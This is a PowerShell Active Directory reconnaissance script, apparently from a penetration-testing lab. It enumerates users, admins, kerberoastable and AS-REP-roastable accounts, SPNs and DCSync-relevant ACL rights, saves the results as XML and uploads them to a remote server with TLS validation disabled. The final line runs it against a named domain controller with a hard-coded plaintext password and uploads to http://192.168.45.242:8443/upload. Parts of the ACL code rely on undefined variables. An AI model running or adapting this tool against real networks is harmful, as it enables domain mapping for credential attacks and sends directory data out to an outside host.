function UploadToWebServer($filepath, $url) {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;
    try {
        $wc = New-Object System.Net.WebClient
        $wc.UploadFile($url, $filepath)
    }
    catch {
    }
}

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    Get-CurrentDomain
    If ($script:Username -and $script:Password) {
        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($script:LDAP, $script:Username, $script:Password)
    }
    else {
        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($script:LDAP)
    }
    
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    $SecurityMasks = 'Dacl'
    $DirectorySearcher.SecurityMasks = Switch ($SecurityMasks) {
        'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
        'Group' { [System.DirectoryServices.SecurityMasks]::Group }
        'None' { [System.DirectoryServices.SecurityMasks]::None }
        'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
        'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
    }

    return $DirectorySearcher.FindAll()
}

function New-ObjectFromProperties {
    param (
        [PSCustomObject]$obj
    )
    $propertiesuniquelist = @()
    $returnObject = @()

    Foreach ($o in $obj) {
        $propertiesuniquelist += $($o.Properties.Keys)
    }

    $propertiesuniquelist = $propertiesuniquelist | Sort-Object -Unique

    Foreach ($o in $obj) {
        $customObject = New-Object PSObject
        Foreach ($prop in $propertiesuniquelist) {
            #write-host $($($($o.properties["$prop"])).GetType()).Name
            #$value = $($o.Properties[$prop] -replace '{', '') -replace '}', ''
            if ($o.Properties[$prop]) {
                switch ($prop) {
                    'objectsid' {
                        $value = (New-Object System.Security.Principal.SecurityIdentifier($($o.properties[$prop]), 0)).toString()
                    }
                    'nTsecuritydescriptor' {
                        Write-Host $o.nTsecuritydescriptor
                        $value = $o.nTsecuritydescriptor
                    }
                    # 'objectguid' {$value = (New-Object System.Guid($($o.properties[$prop]))).toString() }
                    Default {
                        $value = $($o.Properties[$prop] -replace '{', '') -replace '}', ''
                    }
                }
                $customObject | Add-Member -MemberType NoteProperty -Name $prop -Value $value
            } 
            else {
                $value = ''
            }
        }
        $returnObject += $customObject
    }
    Return $returnObject
}

function Get-CurrentDomain {
    param (
        $LDAPString
    ) 

    If ($LDAPString) {
        # LDAP://DC1.corp.com/DC=corp,DC=com
        $d = $LDAPString -replace 'LDAP://', ''
        $d1 = ($d -split '/')[0] 
        $ADSIDN = ($d -split '/')[1] 
        $PDCHostname = ($d1.Split('.'))[0] 
        $PDC = $d1 -replace $PDCHostname + '.', ''
        $DomainName = $($ADSIDN -replace 'DC=', '') -replace ',', '.'
         
        $script:DName = $DomainName
        $script:PDC = $PDC
        $script:DN = $ADSIDN
        $script:LDAP = "LDAP://$PDC/$DN"
    }
    else {
        try {
            $script:DName = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
            $script:PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
            $script:DN = ([adsi]'').distinguishedName 
            $script:LDAP = "LDAP://$PDC/$DN" + $DName
        }
        catch {

        }
    }

    Write-Host $script:LDAP
}

function Get-ObjectsFromAD { 
    param (
        $uploadurl, 
        $outputdir = "$env:temp",
        $type,
        [Switch]$TidyUp,
        $LDAPString,
        [switch]$Quiet
    )
    if ($LDAPstring) {
        Get-CurrentDomain -LDAPString $LDAPstring
    }
    else {
        Get-CurrentDomain
    }
    
    $currentuser = $env:USERNAME
    switch ($type) {
        'users' {
            $query = '(&(objectClass=user)(samaccountname=*)(!(objectclass=computer)))'
        }
        'computers' {
            $query = '(objectclass=computer)'
        }
        'kerberoastableusers' {
            $query = '(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(objectclass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
        }
        'asreproastableusers' {
            $query = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
        }
        'adminusers' {
            $query = '(&(objectCategory=user)(adminCount=1))'
        }
        'groups' {
            $query = '(objectCategory=group)'
        }
        'admingroups' {
            $query = '(&(objectCategory=group)(adminCount=1))'
        }
        'spn' {
            $query = '(servicePrincipalName=*)'
        }
        'computerskeycredentiallink' {
            $query = '(&(objectClass=computer)(msDS-KeyCredentialLink=*))'
        }
        Default {
            $type = 'users'
            $query = '(&(objectClass=user)(samaccountname=*)(!(objectclass=computer)))'
        }
    }

    $users = LDAPSearch -LDAPQuery $query
    $returnobj = New-ObjectFromProperties -obj $users
    if ($returnobj.Count -gt 0) {
        $fn = "$currentuser-$DName-$type.xml"
        Export-Clixml -InputObject $returnobj -Path "$outputdir\$fn"
        if ($uploadurl) { 
            UploadToWebServer -filepath "$outputdir\$fn" -url $uploadurl 
            if ($TidyUp) {
                Remove-Item -Path "$outputdir\$fn" -Force
            }
        }
        if ($Quiet) {

        }
        else {
            Return $returnobj
        }  
    }
}

function Get-AllObjectsFromAD {
    param (
        $uploadurl,
        $LDAPString,
        [switch]$Quiet,
        [string]$Username,
        [string]$Password
    )

    If ($Username -and $Password) {
        $script:Username = $username
        $script:Password = $Password
    }
    $types = @('users', 'computers', 'kerberoastableusers', 'asreproastableusers', 'adminusers', 'groups', 'admingroups', 'spn', 'computerskeycredentiallink')
    foreach ($t in $types) {
        if ($LDAPString) {
            Get-ObjectsFromAD -type $t -uploadurl $uploadurl -LDAPString $LDAPString -Quiet:$quiet
        }
        else {
            Get-ObjectsFromAD -type $t -uploadurl $uploadurl -Quiet:$Quiet
        }
    }

    #Get-ObjectACLFromADByType -type user
}

function Get-ObjectACLFromADByType {
    param (
        $type
    )

    $aclList = @()

    switch ($type) {
        'users' {
            $Object = Get-ObjectsFromAD -type Users -TidyUp
        }
        'computers' {
            $Object = Get-ObjectsFromAD -type Computers -TidyUp
        }
        'group' {
            $Object = Get-ObjectsFromAD -type Groups -TidyUp
        }
        Default {
            $Object = Get-ObjectsFromAD -type Users -TidyUp
        }
    }
    foreach ($o in $Object) {
        $SecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $o.ntsecuritydescriptor, 0
        if ($o.objectsid -and $o.objectsid[0]) {
            $ObjectSid = $o.objectsid.Value
            Write-Host $ObjectSid
        }
        else {
            $ObjectSid = $Null
        }

        foreach ($acl in $SecurityDescriptor.DiscretionaryAcl) {
            $Continue = $False
            $acl | Add-Member NoteProperty 'ObjectDN' $o.distinguishedname
            $acl | Add-Member NoteProperty 'ObjectSID' $ObjectSid
            $acl | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $acl.AccessMask))
        }
        $GuidFilter = Switch ($RightsFilter) {
            'ResetPassword' { @('00299570-246d-11d0-a768-00aa006e0529') }
            'WriteMembers' { @('bf9679c0-0de6-11d0-a285-00aa003049e2') }
            'DCSync' { @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', 'GenericAll', 'ExtendedRight') }
            'AllExtended' { 'ExtendedRight' }
            'ReadLAPS' { @('ExtendedRight', 'GenericAll', 'WriteDacl') }
            'All' { 'GenericAll' }
            Default { '00000000-0000-0000-0000-000000000000' }
        }
        if ($acl.AceQualifier -eq 'AccessAllowed' -and (($acl.ObjectAceType -and $GuidFilter -contains $acl.ObjectAceType) -or ($acl.InheritedObjectAceType -and $GuidFilter -contains $acl.InheritedObjectAceType))) {
            $Continue = $True
        }
        elseif ($acl.AceQualifier -eq 'AccessAllowed' -and !($acl.ObjectAceType) -and !($acl.InheritedObjectAceType) -and (($acl.ActiveDirectoryRights -match $GuidFilter) -or ($GuidFilter -contains $acl.ActiveDirectoryRights))) {
            $Continue = $True
        }
        elseif (($acl.AceQualifier -eq 'AccessAllowed') -and !($acl.ObjectAceType) -and !($acl.InheritedObjectAceType)) {
            ForEach ($Guid in $GuidFilter) {
                if ($acl.ActiveDirectoryRights -match $Guid) {
                    $Continue = $True
                }
            }
        }
        if ($Continue) {

            # if we're resolving GUIDs, map them them to the resolved hash table
            $AclProperties = @{}
            $acl.psobject.properties | ForEach-Object {
                if ($acl.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                    try {
                        $AclProperties[$acl.Name] = $GUIDs[$acl.Value.toString()]
                    }
                    catch {
                        $AclProperties[$acl.Name] = $acl.Value
                    }
                }
                else {
                    $AclProperties[$acl.Name] = $acl.Value
                }
            }
            $OutObject = New-Object -TypeName PSObject -Property $AclProperties
            $aclList += $OutObject
        }
    }
    Return $aclList
}

function Show-SimpleReport {
    param (
        $path = './',
        $user ,
        $domain,
        $MaxItems = 30
    )
    $types = @('users', 'computers', 'kerberoastableusers', 'asreproastableusers', 'adminusers', 'groups', 'admingroups', 'spn', 'computerskeycredentiallink')
    foreach ($t in $types) {
        Remove-Variable $($t) -ErrorAction SilentlyContinue
        New-Variable $($t)
        if (Test-Path -Path "$path/$user-$domain-$t.xml") {
            Write-Host "Importing $path\$user-$domain-$t.xml"
            Set-Variable -Name $($t) -Value $(Import-Clixml -Path "$path\$user-$domain-$t.xml")
        }       
    }
    Write-Host ''
    Write-Host ''
    If ($($users.count) -gt 0) {
        Write-Host "Users Count: $($users.count)" -ForegroundColor Green
        Write-Host 'Variable $users' -ForegroundColor DarkYellow
        If ($($users.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $users | Select-Object -First 30 -Property distinguishedName, samaccountname | Format-Table
        Write-Host "-------"
        Write-Host ""
    }
    If ($($kerberoastableusers.count) -gt 0) {
        Write-Host "Kerber-Roastable Users Count: $($kerberoastableusers.count)" -ForegroundColor Green
        Write-Host 'Variable $kerberoastableusers' -ForegroundColor DarkYellow
        If ($($kerberoastableusers.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $kerberoastableusers | Select-Object -First 30 -Property distinguishedName, samaccountname | Format-Table
        Write-Host "-------"
        Write-Host ""
    }
    If ($($asreproastableusers.count) -gt 0) {
        Write-Host "ASrep-Roastable Users Count: $($asreproastableusers.count)" -ForegroundColor Green
        Write-Host 'Variable $asreproastableusers' -ForegroundColor DarkYellow
        If ($($asreproastableusers.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $asreproastableusers | Select-Object -First 30 -Property distinguishedName, samaccountname | Format-Table
        Write-Host "-------"
        Write-Host ""
    }
    If ($($adminusers.count) -gt 0) {
        Write-Host "AdminCount=1 Users Count: $($adminusers.count)" -ForegroundColor Green
        Write-Host 'Variable $adminusers' -ForegroundColor DarkYellow
        If ($($adminusers.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $adminusers | Select-Object -First 30 -Property distinguishedName, samaccountname | Format-Table
        Write-Host "-------"
        Write-Host ""
    }
    If ($($computers.count) -gt 0) {
        Write-Host "Computers Count: $($computers.count)" -ForegroundColor Green
        Write-Host 'Variable $computers' -ForegroundColor DarkYellow
        If ($($computers.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $computers | Select-Object -First 30 -Property distinguishedName, operatingsystem | Format-Table
        Write-Host "-------"
        Write-Host ""
    }
    If ($($computerskeycredentiallink.count) -gt 0) {
        Write-Host "Computers with key cred links Count: $($computerskeycredentiallink.count)" -ForegroundColor Green
        Write-Host 'Variable $computerskeycredentiallink' -ForegroundColor DarkYellow
        If ($($computerskeycredentiallink.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $computerskeycredentiallink | Select-Object -First 30 -Property distinguishedName, msDS-KeyCredentialLink | Format-Table
        Write-Host "-------"
        Write-Host ""
    }
    If ($($groups.count) -gt 0) {
        Write-Host "Groups Count: $($groups.count)" -ForegroundColor Green
        Write-Host 'Variable $groups' -ForegroundColor DarkYellow
        If ($($groups.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $groups | Select-Object -First 30 -Property distinguishedName, member | Format-Table -Wrap -AutoSize
        Write-Host "-------"
        Write-Host ""
    }
    If ($($admingroups.count) -gt 0) {
        Write-Host "AdminCount=1 Groups Count: $($admingroups.count)" -ForegroundColor Green
        Write-Host 'Variable $admingroups' -ForegroundColor DarkYellow
        If ($($admingroups.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $admingroups | Select-Object -First 30 -Property distinguishedName, member | Format-Table
        Write-Host "-------"
        Write-Host ""
    }
    If ($($spn.count) -gt 0) {
        Write-Host "ServicePrincipalNames Count: $($spn.count)" -ForegroundColor Green
        Write-Host 'Variable $spn' -ForegroundColor DarkYellow
        If ($($spn.count) -gt $MaxItems) { Write-Host "Only the first $MaxItems row are shown" -ForegroundColor Red }
        $spn | Select-Object -First 30 -Property distinguishedName, servicePrincipalName | Format-Table
        Write-Host "-------"
        Write-Host ""
    }

}

get-allobjectsfromad -ldapstring 'ldap://dc01.medtech.com/dc=medtech,dc=com' -uploadurl 'http://192.168.45.242:8443/upload' -username joe -password Flowers1